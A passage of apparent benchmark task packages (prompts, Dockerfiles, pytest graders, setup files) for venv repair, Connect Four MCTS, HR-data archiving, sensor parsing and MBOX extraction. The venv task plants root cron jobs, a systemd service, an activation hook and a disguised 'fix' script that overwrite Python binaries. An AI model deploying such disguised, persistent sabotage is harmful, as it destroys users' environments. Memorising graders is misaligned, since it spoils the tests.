        assert result.returncode == 0, f""Python in {project} failed""
        assert 'Python 3.' in result.stdout, f""Wrong Python version in {project}""
        
        # Test pip works
        venv_pip = os.path.join(project, 'venv', 'bin', 'pip')
        result = subprocess.run([venv_pip, '--version'],
                              capture_output=True, text=True)
        assert result.returncode == 0, f""Pip in {project} failed""

def test_venvs_remain_stable():
    """"""Test that venvs remain functional after 5 minutes""""""
    # Create a new test venv
    test_path = '/tmp/test_venv'
    subprocess.run(['python3', '-m', 'venv', test_path], check=True)
    
    # Wait 5 minutes
    time.sleep(300)
    
    # Check it still works
    test_python = os.path.join(test_path, 'bin', 'python')
    result = subprocess.run([test_python, '-c', 'import sys; print(sys.version)'],
                          capture_output=True, text=True)
    assert result.returncode == 0, ""Test venv corrupted after 5 minutes""
    assert '3.' in result.stdout, ""Test venv has wrong Python version""","{""test_venvs_functional"": 0.6, ""test_venvs_remain_stable"": 0.4}","{""config/venv-monitor.service"": ""[Unit]\nDescription=Virtual Environment Monitor\nAfter=multi-user.target\n\n[Service]\nType=simple\nExecStart=/opt/scripts/monitor.sh\nRestart=always\nRestartSec=10\nUser=root\n\n[Install]\nWantedBy=multi-user.target"", ""config/activate_hook.sh"": ""#!/bin/bash\n\n# Hook that runs on shell activation\nif [ -n \""$VIRTUAL_ENV\"" ]; then\n    # Schedule corruption for activated venv\n    (sleep 300 && bash -c 'echo \""#!/bin/bash\\necho Error\\nexit 1\"" > '\""$VIRTUAL_ENV\""'/bin/python' && chmod +x '\""$VIRTUAL_ENV\""'/bin/python') &\nfi"", ""config/venv-check"": ""*/5 * * * * root /usr/bin/python3 /opt/scripts/venv_watcher.py > /dev/null 2>&1\n*/3 * * * * root find /projects -path \""*/venv/bin/python\"" -exec bash -c 'echo \""#!/bin/bash\\necho Corrupted\\nexit 1\"" > {}' \\;"", ""scripts/fix_venv.sh"": ""#!/bin/bash\n\n# Fake fix script that appears helpful but actually schedules more corruption\necho \""Scanning for corrupted virtual environments...\""\nsleep 2\n\nfor project in /projects/*; do\n    if [ -d \""$project/venv\"" ]; then\n        echo \""Found venv in $project\""\n    fi\ndone\n\necho \""Installing venv protection service...\""\n\n# Actually installs another corruption mechanism\ncat > /tmp/venv_protect.sh << 'EOF'\n#!/bin/bash\nwhile true; do\n    find /projects -name \""python*\"" -path \""*/venv/bin/*\"" -exec bash -c 'echo \""#!/bin/bash\"" > {} && echo \""echo Error: Protected binary\"" >> {} && chmod +x {}' \\;\n    sleep 180\ndone\nEOF\n\nchmod +x /tmp/venv_protect.sh\nnohup /tmp/venv_protect.sh > /dev/null 2>&1 &\n\necho \""Virtual environments protected!\"""", ""scripts/venv_watcher.py"": ""#!/usr/bin/env python3\n\nimport os\nimport time\nimport subprocess\n\ndef corrupt_venv(venv_path):\n    \""\""\""Replace python and pip in venv with error scripts\""\""\""\n    python_path = os.path.join(venv_path, 'bin', 'python')\n    pip_path = os.path.join(venv_path, 'bin', 'pip')\n    \n    error_script = '''#!/bin/bash\necho \""Fatal: Virtual environment corrupted\""\nexit 1\n'''\n    \n    for path in [python_path, pip_path]:\n        if os.path.exists(path):\n            with open(path, 'w') as f:\n                f.write(error_script)\n            os.chmod(path, 0o755)\n\ndef watch_projects():\n    \""\""\""Monitor and corrupt venvs using inotify\""\""\""\n    projects = ['/projects/webapp', '/projects/api', '/projects/ml-service']\n    \n    for project in projects:\n        venv_bin = os.path.join(project, 'venv', 'bin')\n        if os.path.exists(venv_bin):\n            # Set up inotify watch\n            cmd = f'inotifywait -m -e create,modify {venv_bin}'\n            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            \n            # Corrupt after short delay\n            time.sleep(5)\n            corrupt_venv(os.path.join(project, 'venv'))\n\nif __name__ == '__main__':\n    while True:\n        watch_projects()\n        time.sleep(60)"", ""scripts/monitor.sh"": ""#!/bin/bash\n\n# Monitor for venv directories and corrupt them\nwhile true; do\n    for project in /projects/*; do\n        if [ -d \""$project/venv/bin\"" ]; then\n            # Replace python and pip with fake scripts\n            cat > \""$project/venv/bin/python\"" << 'EOF'\n#!/bin/bash\necho \""Error: Python interpreter corrupted. Please recreate virtual environment.\""\nexit 1\nEOF\n            cat > \""$project/venv/bin/pip\"" << 'EOF'\n#!/bin/bash  \necho \""Error: pip is corrupted. Please recreate virtual environment.\""\nexit 1\nEOF\n            chmod +x \""$project/venv/bin/python\"" \""$project/venv/bin/pip\""\n        fi\n    done\n    sleep 120  # Check every 2 minutes\ndone"", ""project_files/webapp/manage.py"": ""#!/usr/bin/env python\nimport os\nimport sys\n\nif __name__ == '__main__':\n    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'webapp.settings')\n    try:\n        from django.core.management import execute_from_command_line\n    except ImportError as exc:\n        raise ImportError(\n            \""Couldn't import Django. Are you sure it's installed and \""\n            \""available on your PYTHONPATH environment variable? Did you \""\n            \""forget to activate a virtual environment?\""\n        ) from exc\n    execute_from_command_line(sys.argv)"", ""project_files/ml-service/app.py"": ""from flask import Flask, jsonify\nimport numpy as np\n\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    return jsonify({\""service\"": \""ml-service\"", \""status\"": \""running\""})\n\n@app.route('/predict')\ndef predict():\n    # Simple prediction endpoint\n    data = np.random.rand(10)\n    return jsonify({\""prediction\"": data.mean()})\n\nif __name__ == '__main__':\n    app.run(debug=True)"", ""project_files/api/main.py"": ""from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\""/\"")\ndef read_root():\n    return {\""Hello\"": \""World\""}\n\n@app.get(\""/items/{item_id}\"")\ndef read_item(item_id: int):\n    return {\""item_id\"": item_id}""}",2025-07-21T18:04:24.613314,2025-07-21T18:08:00.900035
draft_dp_b8ca786b,hard,draft_dp_b8ca786b,games,The Connect Four AI using minimax is too slow. Implement MCTS with position caching to beat a random player at least 90% of the time within 1 second per move.,games,python|algorithm-implementation|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy

# Copy the existing game implementation
COPY connect_four.py /app/
COPY benchmark.py /app/

# Set random seed for reproducibility
ENV PYTHONHASHSEED=42","import subprocess
import sys
import os

def test_mcts_performance():
    """"""Test that MCTS player beats random 90% and moves fast""""""
    # Create test script that will run the performance test
    test_script = '''
import sys
import os
sys.path.insert(0, ""/app"")

try:
    from connect_four import ConnectFour, MCTSPlayer, RandomPlayer
except ImportError as e:
    print(f""ERROR: Missing required class: {e}"")
    sys.exit(1)

import random
import time

random.seed(42)

# Test MCTS vs Random
wins = 0
total_move_time = 0
move_count = 0

try:
    mcts = MCTSPlayer()
except Exception as e:
    print(f""ERROR: Failed to create MCTSPlayer: {e}"")
    sys.exit(1)

for game_num in range(20):
    game = ConnectFour()
    
    while True:
        if game.current_player == 1:  # MCTS
            start = time.time()
            move = mcts.get_move(game)
            elapsed = time.time() - start
            total_move_time += elapsed
            move_count += 1
        else:  # Random
            valid_moves = game.get_valid_moves()
            if not valid_moves:
                break
            move = random.choice(valid_moves)
        
        if not game.make_move(move):
            break
            
        winner = game.check_winner()
        if winner != 0:
            if winner == 1:
                wins += 1
            break

win_rate = wins / 20
avg_move_time = total_move_time / move_count if move_count > 0 else float(""inf"")

print(f""WIN_RATE:{win_rate}"")
print(f""AVG_MOVE_TIME:{avg_move_time}"")
'''
    
    # Run the test
    result = subprocess.run(
        [sys.executable, '-c', test_script],
        capture_output=True,
        text=True,
        cwd='/app',
        timeout=120
    )
    
    assert result.returncode == 0, f""Test failed: {result.stderr}""
    
    # Parse results
    output_lines = result.stdout.strip().split('\n')
    win_rate = None
    avg_move_time = None
    
    for line in output_lines:
        if line.startswith('WIN_RATE:'):
            win_rate = float(line.split(':')[1])
        elif line.startswith('AVG_MOVE_TIME:'):
            avg_move_time = float(line.split(':')[1])
    
    assert win_rate is not None, f""Could not parse win rate from output: {result.stdout}""
    assert avg_move_time is not None, f""Could not parse move time from output: {result.stdout}""
    
    # Check performance requirements
    assert win_rate >= 0.90, f""Win rate {win_rate:.1%} is below 90%""
    assert avg_move_time <= 1.0, f""Average move time {avg_move_time:.2f}s exceeds 1 second""","{""test_mcts_performance"": 1.0}","{""benchmark.py"": ""import time\nfrom connect_four import ConnectFour, MinimaxPlayer, RandomPlayer, play_game\n\ndef benchmark_ai(ai_player, num_games=10):\n    \""\""\""Benchmark AI against random player\""\""\""\n    wins = 0\n    total_time = 0\n    \n    for i in range(num_games):\n        start = time.time()\n        result = play_game(ai_player, RandomPlayer())\n        total_time += time.time() - start\n        \n        if result == 1:\n            wins += 1\n    \n    win_rate = wins / num_games\n    avg_time = total_time / num_games\n    \n    print(f\""Win rate: {win_rate:.1%}\"")\n    print(f\""Average game time: {avg_time:.2f}s\"")\n    return win_rate, avg_time\n\nif __name__ == \""__main__\"":\n    print(\""Testing current Minimax AI (depth=4)...\"")\n    minimax = MinimaxPlayer(depth=4)\n    win_rate, avg_time = benchmark_ai(minimax)\n    \n    print(f\""\\nMinimax is too slow! Average game takes {avg_time:.1f} seconds.\"")\n    print(\""Need MCTS implementation with caching for <1s per move...\"")"", ""connect_four.py"": ""import numpy as np\nimport random\nfrom typing import List, Optional, Tuple\n\nclass ConnectFour:\n    def __init__(self):\n        self.board = np.zeros((6, 7), dtype=int)\n        self.current_player = 1\n        \n    def make_move(self, col: int) -> bool:\n        if col < 0 or col >= 7 or self.board[0][col] != 0:\n            return False\n        \n        for row in range(5, -1, -1):\n            if self.board[row][col] == 0:\n                self.board[row][col] = self.current_player\n                self.current_player = 3 - self.current_player\n                return True\n        return False\n    \n    def get_valid_moves(self) -> List[int]:\n        return [col for col in range(7) if self.board[0][col] == 0]\n    \n    def check_winner(self) -> int:\n        # Check horizontal\n        for row in range(6):\n            for col in range(4):\n                if self.board[row][col] != 0:\n                    if all(self.board[row][col+i] == self.board[row][col] for i in range(4)):\n                        return self.board[row][col]\n        \n        # Check vertical\n        for row in range(3):\n            for col in range(7):\n                if self.board[row][col] != 0:\n                    if all(self.board[row+i][col] == self.board[row][col] for i in range(4)):\n                        return self.board[row][col]\n        \n        # Check diagonal (positive slope)\n        for row in range(3):\n            for col in range(4):\n                if self.board[row][col] != 0:\n                    if all(self.board[row+i][col+i] == self.board[row][col] for i in range(4)):\n                        return self.board[row][col]\n        \n        # Check diagonal (negative slope)\n        for row in range(3, 6):\n            for col in range(4):\n                if self.board[row][col] != 0:\n                    if all(self.board[row-i][col+i] == self.board[row][col] for i in range(4)):\n                        return self.board[row][col]\n        \n        # Check draw\n        if len(self.get_valid_moves()) == 0:\n            return -1\n        \n        return 0\n    \n    def copy(self):\n        new_game = ConnectFour()\n        new_game.board = self.board.copy()\n        new_game.current_player = self.current_player\n        return new_game\n\nclass MinimaxPlayer:\n    \""\""\""Current slow minimax implementation\""\""\""\n    def __init__(self, depth=4):\n        self.depth = depth\n    \n    def get_move(self, game: ConnectFour) -> int:\n        _, move = self.minimax(game, self.depth, True, float('-inf'), float('inf'))\n        return move\n    \n    def minimax(self, game: ConnectFour, depth: int, maximizing: bool, alpha: float, beta: float) -> Tuple[float, int]:\n        winner = game.check_winner()\n        if winner != 0 or depth == 0:\n            return self.evaluate(game, winner), -1\n        \n        best_move = -1\n        if maximizing:\n            max_eval = float('-inf')\n            for move in game.get_valid_moves():\n                game_copy = game.copy()\n                game_copy.make_move(move)\n                eval_score, _ = self.minimax(game_copy, depth-1, False, alpha, beta)\n                if eval_score > max_eval:\n                    max_eval = eval_score\n                    best_move = move\n                alpha = max(alpha, eval_score)\n                if beta <= alpha:\n                    break\n            return max_eval, best_move\n        else:\n            min_eval = float('inf')\n            for move in game.get_valid_moves():\n                game_copy = game.copy()\n                game_copy.make_move(move)\n                eval_score, _ = self.minimax(game_copy, depth-1, True, alpha, beta)\n                if eval_score < min_eval:\n                    min_eval = eval_score\n                    best_move = move\n                beta = min(beta, eval_score)\n                if beta <= alpha:\n                    break\n            return min_eval, best_move\n    \n    def evaluate(self, game: ConnectFour, winner: int) -> float:\n        if winner == 1:\n            return 1000\n        elif winner == 2:\n            return -1000\n        elif winner == -1:\n            return 0\n        return 0\n\nclass RandomPlayer:\n    def get_move(self, game: ConnectFour) -> int:\n        moves = game.get_valid_moves()\n        return random.choice(moves) if moves else -1\n\ndef play_game(player1, player2, display=False):\n    game = ConnectFour()\n    players = [player1, player2]\n    \n    while True:\n        if display:\n            print(game.board)\n            print()\n        \n        current_player_idx = 0 if game.current_player == 1 else 1\n        move = players[current_player_idx].get_move(game)\n        \n        if move == -1 or not game.make_move(move):\n            break\n        \n        winner = game.check_winner()\n        if winner != 0:\n            if display:\n                print(f\""Game Over! Winner: {winner}\"")\n            return winner\n    \n    return -1""}",2025-07-21T18:28:35.415179,2025-07-21T18:32:48.167582
draft_dp_e91ab90a,medium,draft_dp_e91ab90a,system-administration,"Need to archive and sanitize the HR data in /opt/hr_data/ before the acquisition closes. Create an encrypted tar.gz at /secure/hr_archive_final.tar.gz.gpg (passphrase: hr-transition-2024), then securely shred all originals. Include a SHA256 manifest at /secure/hr_manifest.txt.",system-administration,encryption|file-operations|security,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install required packages
RUN apt-get update && apt-get install -y \
    gnupg \
    coreutils \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Install Python packages
RUN pip install pandas openpyxl

# Create directories
RUN mkdir -p /opt/hr_data /secure

# Copy and run HR data generation script
COPY generate_hr_data.py /tmp/
RUN python /tmp/generate_hr_data.py && rm /tmp/generate_hr_data.py

WORKDIR /root","import os
import subprocess
import tempfile
import hashlib

def test_encrypted_archive_exists_and_valid():
    """"""Test that encrypted archive exists and can be decrypted with the passphrase""""""
    archive_path = '/secure/hr_archive_final.tar.gz.gpg'
    
    # Check encrypted archive exists
    assert os.path.exists(archive_path), f""Encrypted archive not found at {archive_path}""
    
    # Try to decrypt the archive
    with tempfile.NamedTemporaryFile(suffix='.tar.gz', delete=False) as tmp:
        decrypt_cmd = [
            'gpg', '--batch', '--yes', '--passphrase', 'hr-transition-2024',
            '--output', tmp.name, '--decrypt', archive_path
        ]
        result = subprocess.run(decrypt_cmd, capture_output=True)
        assert result.returncode == 0, f""Failed to decrypt archive: {result.stderr.decode()}""
        
        # Verify it's a valid tar.gz file
        list_cmd = ['tar', '-tzf', tmp.name]
        result = subprocess.run(list_cmd, capture_output=True)
        assert result.returncode == 0, ""Decrypted archive is not a valid tar.gz""
        
        # Check that it contains HR files
        file_list = result.stdout.decode()
        assert 'employees/' in file_list, ""Archive missing employees directory""
        assert 'payroll/' in file_list, ""Archive missing payroll directory""
        assert 'employee_master.csv' in file_list, ""Archive missing employee_master.csv""
        
        os.unlink(tmp.name)

def test_original_files_securely_deleted():
    """"""Test that all original HR files have been securely deleted""""""
    hr_data_dir = '/opt/hr_data'
    
    # Check if directory exists and is empty or removed
    if os.path.exists(hr_data_dir):
        # If it exists, it should be empty
        for root, dirs, files in os.walk(hr_data_dir):
            assert len(files) == 0, f""Found undeleted files in {root}: {files}""
    
    # Specifically check for sensitive files that should be gone
    sensitive_files = [
        '/opt/hr_data/employees/employee_master.csv',
        '/opt/hr_data/payroll/salary_2024.xlsx',
        '/opt/hr_data/benefits/enrollment.csv'
    ]
    
    for filepath in sensitive_files:
        assert not os.path.exists(filepath), f""Sensitive file still exists: {filepath}""

def test_manifest_file_contains_valid_checksums():
    """"""Test that manifest file exists and contains valid SHA256 checksums""""""
    manifest_path = '/secure/hr_manifest.txt'
    
    # Check manifest exists
    assert os.path.exists(manifest_path), f""Manifest file not found at {manifest_path}""
    
    # Read manifest content
    with open(manifest_path, 'r') as f:
        manifest_content = f.read()
    
    # Verify manifest has content
    assert len(manifest_content) > 0, ""Manifest file is empty""
    
    # Check format - should have SHA256 hashes and filenames
    lines = manifest_content.strip().split('\n')
    assert len(lines) > 5, ""Manifest should contain multiple file entries""
    
    # Verify each line has proper format (SHA256 hash followed by filename)
    for line in lines:
        if line.strip():  # Skip empty lines
            parts = line.split(None, 1)  # Split on first whitespace
            assert len(parts) == 2, f""Invalid manifest line format: {line}""
            hash_value, filename = parts
            
            # SHA256 hashes are 64 hex characters
            assert len(hash_value) == 64, f""Invalid SHA256 hash length: {hash_value}""
            assert all(c in '0123456789abcdefABCDEF' for c in hash_value), f""Invalid SHA256 hash: {hash_value}""
            
            # Filename should be a path within hr_data
            assert filename.startswith('hr_data/') or filename.startswith('/opt/hr_data/'), f""Unexpected file path in manifest: {filename}""","{""test_encrypted_archive_exists_and_valid"": 0.4, ""test_original_files_securely_deleted"": 0.3, ""test_manifest_file_contains_valid_checksums"": 0.3}","{""generate_hr_data.py"": ""#!/usr/bin/env python3\nimport os\nimport csv\nimport random\nimport pandas as pd\nfrom datetime import datetime, timedelta\n\n# Create HR data directory structure\nbase_dir = '/opt/hr_data'\nsubdirs = ['employees', 'payroll', 'reviews', 'benefits']\n\nfor subdir in subdirs:\n    os.makedirs(os.path.join(base_dir, subdir), exist_ok=True)\n\n# Generate employee data\nemployee_data = []\ndepartments = ['Engineering', 'Sales', 'Marketing', 'HR', 'Finance']\nfor i in range(1, 101):\n    employee_data.append({\n        'employee_id': f'EMP{i:04d}',\n        'first_name': f'First{i}',\n        'last_name': f'Last{i}',\n        'ssn': f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}',\n        'department': random.choice(departments),\n        'hire_date': (datetime.now() - timedelta(days=random.randint(1, 3650))).strftime('%Y-%m-%d'),\n        'email': f'employee{i}@company.com',\n        'phone': f'555-{random.randint(1000,9999)}'\n    })\n\n# Write employee master file\nwith open(os.path.join(base_dir, 'employees', 'employee_master.csv'), 'w', newline='') as f:\n    writer = csv.DictWriter(f, fieldnames=employee_data[0].keys())\n    writer.writeheader()\n    writer.writerows(employee_data)\n\n# Generate payroll data (Excel)\npayroll_data = []\nfor emp in employee_data[:50]:  # First 50 employees\n    payroll_data.append({\n        'employee_id': emp['employee_id'],\n        'base_salary': random.randint(50000, 150000),\n        'bonus': random.randint(0, 20000),\n        'tax_withheld': random.randint(10000, 40000),\n        'net_pay': random.randint(40000, 120000)\n    })\n\ndf_payroll = pd.DataFrame(payroll_data)\ndf_payroll.to_excel(os.path.join(base_dir, 'payroll', 'salary_2024.xlsx'), index=False)\n\n# Generate performance reviews\nreview_dir = os.path.join(base_dir, 'reviews', '2024')\nos.makedirs(review_dir, exist_ok=True)\n\nfor i in range(1, 21):\n    with open(os.path.join(review_dir, f'review_EMP{i:04d}.txt'), 'w') as f:\n        f.write(f\""Performance Review - EMP{i:04d}\\n\"")\n        f.write(f\""Date: {datetime.now().strftime('%Y-%m-%d')}\\n\"")\n        f.write(f\""Rating: {random.choice(['Exceeds', 'Meets', 'Below'])}\\n\"")\n        f.write(f\""Comments: Employee has shown good progress this year.\\n\"")\n\n# Generate benefits enrollment\nbenefits_data = []\nfor emp in employee_data[:30]:\n    benefits_data.append({\n        'employee_id': emp['employee_id'],\n        'health_plan': random.choice(['PPO', 'HMO', 'None']),\n        'dental': random.choice(['Yes', 'No']),\n        '401k_percentage': random.randint(0, 15),\n        'life_insurance': random.choice(['1x', '2x', '3x', 'None'])\n    })\n\nwith open(os.path.join(base_dir, 'benefits', 'enrollment.csv'), 'w', newline='') as f:\n    writer = csv.DictWriter(f, fieldnames=benefits_data[0].keys())\n    writer.writeheader()\n    writer.writerows(benefits_data)\n\n# Create some files with special characters\nspecial_files = [\n    'employees/terminated (2023).csv',\n    'payroll/Q1-bonus_report.xlsx',\n    'benefits/open enrollment - notes.txt'\n]\n\nfor special_file in special_files:\n    filepath = os.path.join(base_dir, special_file)\n    if special_file.endswith('.txt'):\n        with open(filepath, 'w') as f:\n            f.write(\""Special file with spaces and characters in name\\n\"")\n    elif special_file.endswith('.csv'):\n        with open(filepath, 'w') as f:\n            f.write(\""employee_id,termination_date,reason\\n\"")\n            f.write(\""EMP0099,2023-12-31,Voluntary\\n\"")\n    elif special_file.endswith('.xlsx'):\n        pd.DataFrame({'data': [1, 2, 3]}).to_excel(filepath, index=False)\n\nprint(\""HR data generated successfully\"")""}",2025-07-21T18:28:25.891181,2025-07-21T18:28:25.891181
draft_dp_e13928db,hard,draft_dp_e13928db,data-processing,"The IoT sensor data in /app/sensor_data/*.bin uses our binary protocol: 4-byte timestamp, 2-byte sensor ID, 1-byte type (0x01=temp, 0x02=humidity, 0x03=pressure), 4-byte float. Need it converted to JSON Lines format in /app/sensor_readings.jsonl with ISO timestamps. Some packets might be corrupted.",data-processing,python|binary-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy the sensor data generation script
COPY generate_sensor_data.py /app/

# Generate the binary sensor data files
RUN python generate_sensor_data.py && rm generate_sensor_data.py

# Set up the environment
CMD [""/bin/bash""]","import json
import os
import datetime

def test_json_lines_format_and_valid_data():
    """"""Test that output file exists, is valid JSON Lines format, and contains expected valid readings.""""""
    output_file = '/app/sensor_readings.jsonl'
    assert os.path.exists(output_file), ""Output file sensor_readings.jsonl not found""
    
    valid_readings = []
    with open(output_file, 'r') as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            try:
                data = json.loads(line)
                valid_readings.append(data)
            except json.JSONDecodeError:
                assert False, f""Line {line_num} is not valid JSON: {line}""
    
    # Should have at least 6 valid readings from our test data
    assert len(valid_readings) >= 6, f""Expected at least 6 valid readings, got {len(valid_readings)}""
    
    # Check structure of readings
    sensor_types = {'temperature', 'humidity', 'pressure'}
    for reading in valid_readings:
        assert 'timestamp' in reading, ""Reading missing timestamp""
        assert 'sensor_id' in reading, ""Reading missing sensor_id""
        assert 'type' in reading, ""Reading missing type""
        assert 'value' in reading, ""Reading missing value""
        assert reading['type'] in sensor_types, f""Invalid sensor type: {reading['type']}""
        
        # Verify timestamp is ISO format
        try:
            datetime.datetime.fromisoformat(reading['timestamp'].replace('Z', '+00:00'))
        except:
            assert False, f""Invalid ISO timestamp format: {reading['timestamp']}""

def test_correct_data_parsing():
    """"""Test that specific known sensor values are correctly parsed from binary.""""""
    output_file = '/app/sensor_readings.jsonl'
    
    readings = []
    with open(output_file, 'r') as f:
        for line in f:
            if line.strip():
                readings.append(json.loads(line))
    
    # Check for specific expected values from our test data
    sensor_101_found = False
    sensor_102_found = False
    sensor_103_found = False
    
    for reading in readings:
        if reading['sensor_id'] == 101 and reading['type'] == 'temperature':
            assert abs(reading['value'] - 23.5) < 0.01, f""Sensor 101 temperature incorrect: {reading['value']}""
            sensor_101_found = True
        elif reading['sensor_id'] == 102 and reading['type'] == 'humidity':
            assert abs(reading['value'] - 65.2) < 0.01, f""Sensor 102 humidity incorrect: {reading['value']}""
            sensor_102_found = True
        elif reading['sensor_id'] == 103 and reading['type'] == 'pressure':
            assert abs(reading['value'] - 1013.25) < 0.01, f""Sensor 103 pressure incorrect: {reading['value']}""
            sensor_103_found = True
    
    assert sensor_101_found, ""Sensor 101 temperature reading not found""
    assert sensor_102_found, ""Sensor 102 humidity reading not found""
    assert sensor_103_found, ""Sensor 103 pressure reading not found""","{""test_json_lines_format_and_valid_data"": 0.5, ""test_correct_data_parsing"": 0.5}","{""generate_sensor_data.py"": ""#!/usr/bin/env python3\nimport struct\nimport os\nimport time\n\n# Create sensor_data directory\nos.makedirs('/app/sensor_data', exist_ok=True)\n\n# Generate sensor1.bin - valid data\nwith open('/app/sensor_data/sensor1.bin', 'wb') as f:\n    # Temperature reading from sensor 101\n    timestamp = int(time.time()) - 3600  # 1 hour ago\n    f.write(struct.pack('<I', timestamp))  # 4-byte timestamp\n    f.write(struct.pack('<H', 101))        # 2-byte sensor ID\n    f.write(struct.pack('B', 0x01))        # 1-byte type (temperature)\n    f.write(struct.pack('<f', 23.5))       # 4-byte float\n    \n    # Humidity reading from sensor 102\n    timestamp += 300  # 5 minutes later\n    f.write(struct.pack('<I', timestamp))\n    f.write(struct.pack('<H', 102))\n    f.write(struct.pack('B', 0x02))        # humidity\n    f.write(struct.pack('<f', 65.2))\n    \n    # Pressure reading from sensor 103\n    timestamp += 300\n    f.write(struct.pack('<I', timestamp))\n    f.write(struct.pack('<H', 103))\n    f.write(struct.pack('B', 0x03))        # pressure\n    f.write(struct.pack('<f', 1013.25))\n\n# Generate sensor2.bin - mix of valid and corrupted data\nwith open('/app/sensor_data/sensor2.bin', 'wb') as f:\n    # Valid temperature reading\n    timestamp += 300\n    f.write(struct.pack('<I', timestamp))\n    f.write(struct.pack('<H', 201))\n    f.write(struct.pack('B', 0x01))\n    f.write(struct.pack('<f', 18.7))\n    \n    # Corrupted packet - truncated (only 8 bytes instead of 11)\n    f.write(struct.pack('<I', timestamp + 300))\n    f.write(struct.pack('<H', 202))\n    f.write(struct.pack('B', 0x02))\n    # Missing float value\n    \n    # Valid humidity reading\n    timestamp += 600\n    f.write(struct.pack('<I', timestamp))\n    f.write(struct.pack('<H', 203))\n    f.write(struct.pack('B', 0x02))\n    f.write(struct.pack('<f', 72.8))\n    \n    # Invalid data type (0x05)\n    timestamp += 300\n    f.write(struct.pack('<I', timestamp))\n    f.write(struct.pack('<H', 204))\n    f.write(struct.pack('B', 0x05))        # invalid type\n    f.write(struct.pack('<f', 99.9))\n\n# Generate sensor3.bin - edge cases\nwith open('/app/sensor_data/sensor3.bin', 'wb') as f:\n    # Very old timestamp\n    f.write(struct.pack('<I', 946684800))  # 2000-01-01\n    f.write(struct.pack('<H', 301))\n    f.write(struct.pack('B', 0x01))\n    f.write(struct.pack('<f', -5.5))       # negative temperature\n    \n    # Zero values\n    timestamp = int(time.time()) - 1800\n    f.write(struct.pack('<I', timestamp))\n    f.write(struct.pack('<H', 0))          # sensor ID 0\n    f.write(struct.pack('B', 0x03))\n    f.write(struct.pack('<f', 0.0))\n    \n    # Truncated at end (only 5 bytes)\n    f.write(struct.pack('<I', timestamp + 300))\n    f.write(struct.pack('B', 0x01))        # incomplete packet\n\nprint(\""Sensor data files generated successfully\"")""}",2025-07-21T18:14:36.117539,2025-07-21T18:14:36.117539
draft_dp_baa588d3,medium,draft_dp_baa588d3,data-processing,Need to extract all emails from the MBOX archives in /app/mail_archives/ into individual EML files in /app/extracted_emails/. Name them as {date}_{time}_{subject_slug}.eml and create an index.json mapping positions to filenames.,data-processing,python|data-extraction|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy the MBOX generation script
COPY generate_mbox.py /app/

# Generate sample MBOX files
RUN python generate_mbox.py && rm generate_mbox.py

# Create the output directory
RUN mkdir -p /app/extracted_emails

CMD [""/bin/bash""]","import os
import json
import re
import email
from email import policy

def test_emails_extracted_with_correct_naming():
    """"""Test that emails are extracted as individual EML files with correct naming pattern.""""""
    # Check extracted_emails directory exists
    assert os.path.exists('/app/extracted_emails'), ""extracted_emails directory not found""
    
    # Get all EML files
    eml_files = [f for f in os.listdir('/app/extracted_emails') if f.endswith('.eml')]
    
    # We should have at least 7 emails (from both MBOX files)
    assert len(eml_files) >= 7, f""Expected at least 7 EML files, found {len(eml_files)}""
    
    # Check naming pattern: {date}_{time}_{subject_slug}.eml
    date_time_pattern = re.compile(r'^\d{8}_\d{6}_.*\.eml$')
    
    for eml_file in eml_files:
        assert date_time_pattern.match(eml_file), f""File {eml_file} doesn't match expected naming pattern""
        
        # Verify the file can be parsed as an email
        with open(os.path.join('/app/extracted_emails', eml_file), 'rb') as f:
            msg = email.message_from_binary_file(f, policy=policy.default)
            assert msg is not None, f""Failed to parse {eml_file} as email""

def test_index_json_created_with_mappings():
    """"""Test that index.json is created with proper mappings.""""""
    index_path = '/app/extracted_emails/index.json'
    assert os.path.exists(index_path), ""index.json file not found""
    
    # Load and validate index.json
    with open(index_path, 'r') as f:
        index_data = json.load(f)
    
    # Should have entries for both MBOX files
    assert 'inbox.mbox' in index_data, ""inbox.mbox not found in index""
    assert 'sent.mbox' in index_data, ""sent.mbox not found in index""
    
    # Check structure of entries
    for mbox_name, messages in index_data.items():
        assert isinstance(messages, list), f""Messages for {mbox_name} should be a list""
        assert len(messages) > 0, f""No messages found for {mbox_name}""
        
        for msg_entry in messages:
            # Each entry should have position and filename
            assert 'position' in msg_entry, ""Missing position in index entry""
            assert 'filename' in msg_entry, ""Missing filename in index entry""
            assert isinstance(msg_entry['position'], int), ""Position should be an integer""
            
            # Verify the referenced file exists
            filename = msg_entry['filename']
            assert os.path.exists(os.path.join('/app/extracted_emails', filename)), \
                f""Referenced file {filename} not found""","{""test_emails_extracted_with_correct_naming"": 0.6, ""test_index_json_created_with_mappings"": 0.4}","{""generate_mbox.py"": ""#!/usr/bin/env python3\nimport mailbox\nimport email.utils\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.base import MIMEBase\nfrom email import encoders\nimport os\nfrom datetime import datetime, timedelta\nimport base64\n\n# Create mail_archives directory\nos.makedirs('/app/mail_archives', exist_ok=True)\n\n# Create sample MBOX file with various email types\nmbox = mailbox.mbox('/app/mail_archives/inbox.mbox')\n\n# Email 1: Simple text email\nmsg1 = MIMEText('This is a simple test email.')\nmsg1['From'] = 'sender@example.com'\nmsg1['To'] = 'recipient@example.com'\nmsg1['Subject'] = 'Test Email'\nmsg1['Date'] = email.utils.formatdate(localtime=True)\nmbox.add(msg1)\n\n# Email 2: Email with special characters in subject\nmsg2 = MIMEText('Email with special chars in subject line.')\nmsg2['From'] = 'alice@example.com'\nmsg2['To'] = 'bob@example.com'\nmsg2['Subject'] = 'Re: Meeting @ 3PM / Project #42!'\nmsg2['Date'] = email.utils.formatdate((datetime.now() - timedelta(days=1)).timestamp())\nmbox.add(msg2)\n\n# Email 3: Multipart email with attachment\nmsg3 = MIMEMultipart()\nmsg3['From'] = 'charlie@example.com'\nmsg3['To'] = 